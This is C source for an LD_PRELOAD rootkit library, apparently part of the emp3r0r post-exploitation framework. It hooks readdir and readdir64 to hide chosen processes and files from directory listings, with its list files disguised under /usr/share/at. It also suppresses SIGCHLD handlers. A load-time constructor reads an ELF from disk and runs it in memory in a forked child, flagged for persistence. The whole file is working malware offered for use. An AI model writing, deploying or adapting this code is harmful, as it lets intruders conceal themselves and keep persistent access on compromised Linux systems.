#define _GNU_SOURCE
#include "elf.h"
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// customize these
const char *HIDE_ME = "emp3r0r";
const char *HIDDEN_PIDS = "/usr/share/at/batch-job.at";
const char *HIDDEN_FILES = "/usr/share/at/daily-job.at";

// trim trailing whitespace from a string
void trim_str(char *buffer) { buffer[strcspn(buffer, "\r\n")] = 0; }

// declare sigaction function here to override the one in libc
// this fixes #244
int sigaction(int signum, const struct sigaction *act,
              struct sigaction *oldact) {
  static int (*orig_sigaction)(int signum, const struct sigaction *act,
                               struct sigaction *oldact) = NULL;
  if (!orig_sigaction)
    orig_sigaction = dlsym(RTLD_NEXT, "sigaction");

  if (signum == SIGCHLD) {
    return 0;
  }

  return orig_sigaction(signum, act, oldact);
}

int is_file_exist(const char *path) {
  if (access(path, F_OK) != -1) {
    return 1;
  }
  return 0;
}

int is_str_in_file(const char *path, const char *str) {
  FILE *fd = fopen(path, "r");
  int bufferLength = 255;
  char buffer[bufferLength];
  while (fgets(buffer, bufferLength, fd)) {
    trim_str(buffer);
    if (strncmp(str, buffer, strlen(str)) == 0) {
      fclose(fd);
      return 1;
    }
  }
  fclose(fd);
  return 0;
}

// check if a pid/file should be hidden
// returns 1 if is PID and hidden
// returns 2 if is file and hidden
// returns 0 if not hidden
int is_hidden(const char *name) {
  if (is_file_exist(HIDDEN_PIDS)) {
    if (is_str_in_file(HIDDEN_PIDS, name)) {
      return 1;
    }
  }
  if (is_file_exist(HIDDEN_FILES)) {
    if (is_str_in_file(HIDDEN_FILES, name)) {
      return 2;
    }
  }
  return 0;
}

// Get a directory name given a DIR* handle
static int get_dir_name(DIR *dirp, char *dir_name, size_t size) {
  int fd = dirfd(dirp);
  if (fd == -1) {
    return 0;
  }

  char dir_fd_path[64];
  snprintf(dir_fd_path, sizeof(dir_fd_path), "/proc/self/fd/%d", fd);
  ssize_t ret = readlink(dir_fd_path, dir_name, size);
  if (ret == -1) {
    return 0;
  }

  dir_name[ret] = 0;
  return 1;
}

DIR *opendir(const char *name) {
  static DIR *(*orig_opendir)(const char *) = NULL;
  if (!orig_opendir)
    orig_opendir = dlsym(RTLD_NEXT, "opendir");

  DIR *result = orig_opendir(name);

  return result;
}

struct dirent64 *readdir64(DIR *dirp) {
  static struct dirent64 *(*orig_readdir64)(DIR *dirp) = NULL;
  if (!orig_readdir64)
    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");

  struct dirent64 *result = NULL;
  DIR *proc_1 = opendir("/proc/1");
  struct dirent64 *proc1_dir = orig_readdir64(proc_1);
  closedir(proc_1);

  result = orig_readdir64(dirp);
  if (!result) {
    return NULL;
  }

  char pwd[1024];
  if (get_dir_name(dirp, pwd, 1024)) {
    // processes
    if (strcmp(pwd, "/proc") == 0) {
      if (is_hidden(result->d_name) == 1) {
        return proc1_dir;
      }
    }

    // files
    if (is_hidden(result->d_name) == 2) {
      return proc1_dir;
    }

    // HIDE_ME pattern in filename
    if (strstr(result->d_name, HIDE_ME)) {
      return proc1_dir;
    }
  }

  return result;
}

struct dirent *readdir(DIR *dirp) {
  static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
  if (!orig_readdir)
    orig_readdir = dlsym(RTLD_NEXT, "readdir");

  struct dirent *result = NULL;
  DIR *proc_1 = opendir("/proc/1");
  struct dirent *proc1_dir = orig_readdir(proc_1);
  closedir(proc_1);

  result = orig_readdir(dirp);
  if (!result) {
    return NULL;
  }

  char pwd[1024];
  if (get_dir_name(dirp, pwd, 1024)) {
    // processes
    if (strcmp(pwd, "/proc") == 0) {
      if (is_hidden(result->d_name) == 1) {
        return proc1_dir;
      }
    }

    // files
    if (is_hidden(result->d_name) == 2) {
      return proc1_dir;
    }

    // HIDE_ME pattern in filename
    if (strstr(result->d_name, HIDE_ME)) {
      return proc1_dir;
    }
  }

  return result;
}

void __attribute__((constructor)) initLibrary(void) {
  // ignore SIGCHLD
  signal(SIGCHLD, SIG_IGN);

  // prevent self delete of agent
  // see cmd/agent/main.go
  setenv("PERSISTENCE", "true", 1);
  // tell agent not to change argv
  setenv("LD", "true", 1);

  // where to read target ELF file
  // this should be in sync with emp3r0r inject_loader module
  char *exe = calloc(1024, sizeof(char));
  if (readlink("/proc/self/exe", exe, 1024) < 0) {
    perror("readlink");
    return;
  }
  const char *exe_name = basename(exe);
  char *elf_path = calloc(1024, sizeof(char)); // path to target ELF file
  const char *cwd = getcwd(NULL, 0);
  // decides where to get target ELF binary
  snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);

  // check if target ELF file exists, if not, abort
  if (!is_file_exist(elf_path)) {
    return;
  }

  // read it
  FILE *f = fopen(elf_path, "rb");
  if (f == NULL) {
    return;
  }
  fseek(f, 0, SEEK_END);
  int size = ftell(f);
  fseek(f, 0L, SEEK_SET);
  char *buf = malloc(size);
  fread(buf, size, 1, f);
  fclose(f);
  char *argv[] = {elf_path, NULL};
  char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
                  "HOME=/tmp",
                  "PERSISTENCE=true",
                  "LD=true",
                  "VERBOSE=false",
                  NULL};

  pid_t child = fork();
  // in child process
  if (child == 0) {
    // Run the ELF
    elf_run(buf, argv, envv);
  }
}

void __attribute__((destructor)) cleanUpLibrary(void) {}
